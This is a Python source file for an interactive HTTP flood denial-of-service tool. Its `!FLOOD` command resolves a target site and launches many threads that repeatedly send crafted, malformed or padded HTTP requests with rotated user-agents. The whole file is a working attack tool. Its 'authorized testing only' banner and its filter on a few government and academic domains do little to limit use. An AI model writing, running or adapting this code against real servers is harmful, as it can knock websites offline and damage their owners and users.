import socket
import threading
import string
import random
import time
import os
import platform
import sys
import select
import ssl
import logging
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse
try:
    from colorama import Fore, init
    init(autoreset=True)
except ModuleNotFoundError as e:
    print(f"Error: {e}. Please install colorama using 'pip install colorama'")
    exit()

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

stop_attack = threading.Event()
success_count = 0  # Track successful connections

# Clear screen
def clear_text():
    os.system('cls' if platform.system().upper() == "WINDOWS" else 'clear')

# Generate random URL path
def generate_url_path_pyflooder(num):
    msg = string.ascii_letters + string.digits + string.punctuation
    return "".join(random.sample(msg, int(num)))

def generate_url_path_choice(num):
    letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
    return ''.join(random.choice(letter) for _ in range(int(num)))

# Generate large payload
def generate_large_payload(size=4096):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(size))

# List of User-Agents for randomization
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
]

# Attack logic
def DoS_Attack(ip, host, port, type_attack, booter_sent, data_type_loader_packet, use_ssl=False):
    global success_count
    if stop_attack.is_set():
        return
    url_path = generate_url_path_pyflooder(5) if random.choice(['PY_FLOOD', 'CHOICES_FLOOD']) == "PY_FLOOD" else generate_url_path_choice(5)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setblocking(False)  # Non-blocking socket
    if use_ssl:
        context = ssl.create_default_context()
        s = context.wrap_socket(s, server_hostname=host)
    try:
        payload_patterns = {
            'PY': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\nAccept: text/html\n\n",
            'OWN1': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\n\n\r\r",
            'OWN2': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\r\r\n\n",
            'OWN3': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\n\r\n",
            'OWN4': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\n\n\n\n",
            'OWN5': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\n\n\n\n\r\r\r\r",
            'OWN6': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\n\r\n\r\n",
            'OWN7': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\n\r\n\r",
            'OWN8': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\n\b\n\b\n\r\n\r",
            'TEST': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\n\b\n\b\n\r\n\r\n\n",
            'TEST2': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\n\b\n\b\n\n\r\r\n\r\n\n\n",
            'TEST3': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\n\b\n\b\n\a\n\r\n\n",
            'TEST4': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\n\b\n\b\n\a\n\a\n\n\r\r",
            'TEST5': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\n\b\n\t\n\n\r\r",
            'LARGE': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\nContent-Length: 4096\nAccept: text/html\nReferer: https://{host}\n\n{generate_large_payload(4096)}",
            'XLARGE': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\nConnection: keep-alive\nUser-Agent: {random.choice(user_agents)}\nContent-Length: 8192\nAccept: text/html\nReferer: https://{host}\n\n{generate_large_payload(8192)}",
        }
        packet_data = payload_patterns.get(data_type_loader_packet, payload_patterns['PY']).encode()
        s.connect((ip, port))
        s.setblocking(True)  # Switch to blocking for sending
        sent_bytes = 0
        for _ in range(booter_sent):
            if stop_attack.is_set():
                break
            s.sendall(packet_data)
            sent_bytes += len(packet_data)
        success_count += 1
        logging.info(f"Successful connection: Sent {sent_bytes} bytes to {ip}:{port}")
    except (ConnectionError, TimeoutError, socket.gaierror, ssl.SSLError) as e:
        logging.error(f"Attack error on {ip}:{port}: {type(e).__name__} - {str(e)}")
    finally:
        s.close()

# Running attack with ThreadPoolExecutor
def runing_attack(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet, use_ssl):
    with ThreadPoolExecutor(max_workers=spam_loader) as executor:
        while time.time() < time_loader and not stop_attack.is_set():
            futures = [executor.submit(DoS_Attack, ip, host, port_loader, methods_loader, booter_sent, data_type_loader_packet, use_ssl) for _ in range(spam_loader)]
            for future in futures:
                future.result()

# Countdown + interrupt
def countdown_timer(time_loader):
    remaining = int(time_loader - time.time())
    while remaining > 0 and not stop_attack.is_set():
        sys.stdout.write(f"\r{Fore.YELLOW}Time remaining: {remaining} seconds | Successful connections: {success_count}{Fore.RESET}")
        sys.stdout.flush()
        if sys.stdin in select.select([sys.stdin], [], [], 1)[0]:
            _ = sys.stdin.readline()
            stop_attack.set()
            print(f"\n{Fore.RED}Attack stopped by user{Fore.RESET}")
            return
        time.sleep(1)
        remaining = int(time_loader - time.time())
    if not stop_attack.is_set():
        print(f"\n{Fore.GREEN}Attack completed | Total successful connections: {success_count}{Fore.RESET}")
        stop_attack.set()

# Exit confirmation
def confirm_exit():
    while True:
        choice = input(f"{Fore.YELLOW}Exit program? (y/n): {Fore.RESET}").lower()
        if choice == 'y':
            print(f"{Fore.RED}Program terminated by user. Exiting...{Fore.RESET}")
            sys.exit(0)
        elif choice == 'n':
            print()
            return

# Validate URL and extract host, protocol
def validate_target(target):
    try:
        parsed = urlparse(target if target.startswith(('http://', 'https://')) else f'http://{target}')
        host = parsed.hostname
        if not host:
            raise ValueError("Invalid URL")
        if any(x in host for x in ['.gov', '.mil', '.edu', '.ac']):
            raise ValueError("Attacking .gov, .mil, .edu, or .ac domains is prohibited")
        ip = socket.gethostbyname(host)
        return ip, host, parsed.scheme == 'https'
    except (ValueError, socket.gaierror) as e:
        logging.error(f"Target validation error: {e}")
        return None, None, None

# Main command loop
def command():
    global stop_attack, success_count
    print(f"{Fore.RED}WARNING: This tool is for AUTHORIZED SECURITY TESTING ONLY. Unauthorized use is ILLEGAL and may result in severe legal consequences. Ensure you have explicit permission from the server owner before proceeding.{Fore.RESET}")
    while True:
        try:
            data_input_loader = input(f"{Fore.CYAN}COMMAND {Fore.WHITE}${Fore.RESET} ")
            if not data_input_loader:
                confirm_exit()
                continue

            args_get = data_input_loader.split()
            if args_get[0].lower() == "clear":
                clear_text()
            elif args_get[0].upper() == "!FLOOD":
                if len(args_get) == 10:
                    data_type_loader_packet = args_get[1].upper()
                    target_loader = args_get[2]
                    try:
                        port_loader = int(args_get[3])
                        if not 1 <= port_loader <= 65535:
                            raise ValueError
                    except ValueError:
                        print(f"{Fore.RED}Port must be a number between 1-65535{Fore.RESET}")
                        continue
                    time_loader = time.time() + int(args_get[4])
                    spam_loader = int(args_get[5])  # No upper limit, user responsibility
                    create_thread = int(args_get[6])
                    booter_sent = int(args_get[7])
                    methods_loader = args_get[8]
                    spam_create_thread = int(args_get[9])

                    ip, host, use_ssl = validate_target(target_loader)
                    if not ip:
                        print(f"{Fore.YELLOW}Invalid target or unable to resolve URL{Fore.RESET}")
                        continue

                    stop_attack.clear()
                    success_count = 0
                    print(f"{Fore.LIGHTCYAN_EX}Starting attack\n{Fore.YELLOW}Target: {target_loader}\nPort: {port_loader}\nType: {data_type_loader_packet}\nProtocol: {'HTTPS' if use_ssl else 'HTTP'}{Fore.RESET}")

                    for _ in range(create_thread):
                        for _ in range(spam_create_thread):
                            threading.Thread(target=runing_attack, args=(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet, use_ssl)).start()

                    countdown_timer(time_loader)
                    continue
                else:
                    print(f"{Fore.RED}!FLOOD <TYPE_PACKET> <TARGET> <PORT> <TIME> {Fore.LIGHTRED_EX}<SPAM_THREAD> <CREATE_THREAD> <BOOTER_SENT> {Fore.WHITE}<HTTP_METHODS> <SPAM_CREATE>{Fore.RESET}")
            else:
                print(f"{Fore.WHITE}[{Fore.YELLOW}+{Fore.WHITE}] {Fore.RED}{data_input_loader} {Fore.LIGHTRED_EX}Command not found{Fore.RESET}")
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}Program terminated by user. Exiting...{Fore.RESET}")
            stop_attack.set()
            sys.exit(0)

if __name__ == "__main__":
    try:
        command()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Program terminated by user. Exiting...{Fore.RESET}")
        stop_attack.set()
        sys.exit(0)
